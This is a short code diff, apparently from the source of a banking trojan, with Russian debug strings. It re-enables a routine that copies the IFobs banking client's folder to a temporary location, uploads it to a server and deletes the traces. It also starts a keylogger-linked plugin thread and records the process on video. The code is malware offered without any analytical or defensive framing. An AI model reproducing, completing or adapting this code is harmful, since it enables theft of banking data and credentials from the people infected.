@@ -315,7 +315,7 @@ DWORD WINAPI SendIFobs(LPVOID)
 	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
 	{
 		DBG( "IFobs", "Копирование на сервер" );
-		VideoProcess::SendFiles( 0, tempFolder );
+		VideoProcess::SendFiles( 0, 0, tempFolder );
 		DeleteFolders(tempFolder);
 		DBG( "IFobs", "Копирование на сервер окончено" );
 	}
@@ -328,11 +328,11 @@ void Activeted(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
-//	RunThread( PluginIFobs, 0 );
-//	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
-//		MegaJump(SendIFobs);
-//	VideoProcess::RecordPID( "IFobs" );
-	VideoProcess::SendLog( "test", 0, "go!");
+	RunThread( PluginIFobs, 0 );
+	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
+		MegaJump(SendIFobs);
+	VideoProcess::RecordPID( 0, "IFobs" );
+	VideoProcess::SendLog( 0, "test", 0, "go!");
 }
 
 bool Init( const char* appName )
